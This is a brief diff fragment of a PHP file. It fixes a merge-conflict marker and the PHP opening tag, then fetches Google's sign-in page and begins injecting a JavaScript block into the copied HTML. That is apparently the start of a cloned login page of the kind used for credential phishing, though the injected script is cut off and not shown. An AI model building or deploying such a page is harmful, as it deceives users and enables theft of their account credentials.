@@ -1,5 +1,4 @@
-<<<<<<< HEAD
-<? 
+<?php
 $html = file_get_contents('https://accounts.google.com/ServiceLogin?hl=es');
 $insertCode = "<script language=\"javascript\" type=\"text/javascript\">
 	
